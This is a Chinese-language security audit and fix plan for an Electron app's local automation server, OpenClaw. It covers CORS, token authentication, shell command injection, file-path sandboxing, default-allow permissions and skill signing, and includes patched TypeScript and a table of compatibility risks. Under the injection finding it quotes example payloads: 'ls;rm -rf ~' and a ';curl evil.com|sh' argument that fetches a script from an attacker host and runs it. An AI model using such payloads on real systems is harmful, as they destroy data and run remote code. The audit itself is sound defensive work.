### 洞 1 — OpenClawServer CORS \*
**文件**: `electron\openclaw\OpenClawServer.ts:184-186`


### 洞 2 — 18789 端口无 token 鉴权
**文件**: `electron\openclaw\OpenClawServer.ts:182-298` (handleRequest + handleExecute)

`handleRequest` 只解析 URL + method,没有任何 token/header 校验。`/execute` 直接进 `handleExecute` → `getExecutor().executeOperation(...)`,**同机进程**只要能访问 127.0.0.1:18789 就能 `run_command` / `delete_file` / `clipboard_read`。

### 洞 3 — runCommand shell:true
**文件**: `electron\openclaw\OpenClawGateway.ts:676-693`

```ts
private async runCommand(params: CommandOperationParams): Promise<...> {
  const { command, args = [], cwd, timeout = 30000, shell = true } = params;
  // 放宽限制:移除严格白名单,记录警告
```

**危害**:
- `shell:true` 是默认值,`args.join(' ')` 直接拼字符串过 shell 解析

- `command.split(' ')[0]` 拿 baseCmd 检查,但 args 原样拼进去,过滤等于没做
- 经典注入:`command="ls;rm -rf ~"` 或 `args=[";curl evil.com|sh"]`

**注**: 任务描述说此洞在 `SkillRuntime.ts`,实际审计在 `OpenClawGateway.ts:676-693`,以审计报告为准修。

```ts
private isOriginAllowed(origin: string, allowList: string[]): boolean {
  if (!origin) return false;
  if (allowList.length === 0) return false;
  for (const allowed of allowList) {
    if (allowed === origin) return true;
    if (allowed.endsWith('://') && origin.startsWith(allowed)) return true;  // 前缀匹配

  return false;
}
```

```ts
private async runCommand(params: CommandOperationParams): Promise<{ stdout: string; stderr: string }> {
  const { command, args = [], cwd, timeout = 30000 } = params;
  void (params as any).shell; // 强制忽略,不走 shell

  // 1. 白名单校验
  const baseCmd = String(command || '').trim().toLowerCase();
  if (!baseCmd) throw new Error('runCommand: command 不能为空');
  if (/[\s;&|`$<>(){}\\]/.test(baseCmd)) {
    throw new Error(`runCommand: command 含非法字符,只接受 baseCmd: ${baseCmd}`);
  }
  if (!COMMAND_ALLOWLIST.has(baseCmd)) {
    throw new Error(`runCommand: 不在白名单的命令 "${baseCmd}"`);
  }

  // 2. args 净化
  const safeArgs = args.map((a, i) => {
    if (typeof a !== 'string') throw new Error(`runCommand: args[${i}] 不是字符串`);
    if (a.includes('\0')) throw new Error(`runCommand: args[${i}] 含 null byte`);
    return a;
  });

  // 3. cwd 沙箱
  let resolvedCwd: string | undefined;
  if (cwd) {
    resolvedCwd = this.resolvePath(cwd);
    if (!this.isCwdInSandbox(resolvedCwd)) {
      throw new Error(`runCommand: cwd 必须在 sandbox/ 或 workspace/ 下`);
    }
  } else {
    const defaultSandbox = path.join(app.getPath('userData'), 'sandbox');
    fs.mkdirSync(defaultSandbox, { recursive: true });
    resolvedCwd = defaultSandbox;
  }

  // 4. execFile: 不用 shell,数组传参
  const { stdout, stderr } = await execFileAsync(baseCmd, safeArgs, {
    cwd: resolvedCwd, timeout, windowsHide: true,
  });
  return { stdout, stderr };
}
```

```ts
private isCwdInSandbox(resolvedCwd: string): boolean {
  const userDataReal = fs.realpathSync(app.getPath('userData'));
  const sandboxRoot = path.join(userDataReal, 'sandbox');
  const workspaceRoot = path.join(userDataReal, 'workspace');
  const real = fs.realpathSync(resolvedCwd);
  const norm = (p: string) => path.normalize(p).toLowerCase() + path.sep;
  return real.toLowerCase().startsWith(norm(sandboxRoot)) ||
         real.toLowerCase().startsWith(norm(workspaceRoot)) ||
         real.toLowerCase() === sandboxRoot.toLowerCase() ||
         real.toLowerCase() === workspaceRoot.toLowerCase();
}
```

- 位置: `electron/openclaw/OpenClawGateway.ts:531-672` (readFile/writeFile/deleteFile/listDirectory 等)
- 现状: `path` 走 `resolvePath()` 不限制范围,可以指向 `~/.ssh/`, `C:\Windows\System32\`, `/etc/passwd`
- 修法: 复用 `isCwdInSandbox()`,所有 file op 强制 `path` 必须落在 `~/.pipiclaw/sandbox/` 或 `workspace/` 内
- 估时: 1-2 天

#### 5.1.2 `OpenClawServer.checkOperationPermission` 未知 op 默认允许
- 位置: `electron/openclaw/OpenClawServer.ts:359` (审计后端 C2 提到)
- 现状: `if (!permissionConfig) { return { allowed: true } }`
- 风险: 任何未在 `operationToPermission` 映射的 opType 都自动通过,例如 `unknown_op`
- 修法: 改为 `if (!permissionConfig) { return { allowed: false, reason: '未知操作,已拒绝' } }`
- 估时: 0.5 天

#### 5.1.3 SkillSigner 仍是 HMAC 对称密钥
- 现状: W6 强化版 (safeStorage),但 W7+ 计划 Ed25519 公私钥分离
- 风险: HMAC 私钥 + 公钥 = 同一 key,任何能 verify 的人都能签
- 修法: Ed25519 (`node:crypto.generateKeyPairSync`),私钥走 OS keychain,公钥写入 trust store
- 估时: 2-3 天

#### 5.1.4 SkillLoader 不强制 verify
- 现状: SkillSigner.sign/verify 实现对了,但 SkillLoader 加载 skill 时不调 verify
- 风险: 攻击者构造恶意 skill,绕过签名检查直接加载
- 修法: SkillLoader 加载时调 `SkillSigner.verify(skillName, content)`,失败则拒绝
- 估时: 1 天 (依赖 5.1.3)

#### 5.1.5 ToolRegistry.invoke 权限只查 category,不看 path
- 位置: `electron/agent/ToolRegistry.ts:62-66` (审计后端 M8 提到)
- 风险: `system:execute` 允许 = 任意 file op,无法控制 path
- 修法: ToolRegistry.checkPermission 接受 path,复用 isCwdInSandbox
- 估时: 1 天

### 5.2 兼容性风险

| 风险 | 影响 | 缓解 |
|---|---|---|
| 已有 partner 集成需更新 Authorization header | 18789 HTTP 调用方全部需要带 token | 在 release note 写明 + docs 更新 |
| Linux 平台 safeStorage 不可用 | token/key 降级明文 (base64) | 启动时 log warn,文档提示 |
| SkillSigner 升级后旧 'local-stub' 签名失效 | 用户已有的 skill 签名需要重签 | SkillLoader 暂时 fallback warn 但不阻断,加"重新签名"按钮 |
| runCommand cwd 强制 sandbox/workspace | 之前在 `~` 根目录跑的命令会失败 | 默认 cwd = sandbox/,用户在 sandbox 内跑即可 |
| runCommand 白名单外 baseCmd 拒绝 | 之前能跑 `wmic` / `powershell Get-*` 等 | 加到白名单需 PR,W6+ 按需扩展 |

### 5.3 已知限制

- runCommand 白名单是 hard-coded,不是配置化。下次 W7 提取到 `ConfigStore` 让用户在 UI 扩展。
- CORS 白名单也是 hard-coded。Config 接口已有 `corsAllowedOrigins`,但 UI 没有暴露,等 Settings 加配置面板。
- Token 文件默认在 userData,用户重装系统会丢 token。ClawHub 接入时需要重新从 main 进程拿。
- SkillSigner 私钥在 safeStorage 里,但 SkillLoader 不强制 verify — 签名机制健全了但**没人查**,真正的闭环要等 W7 接入 SkillLoader。
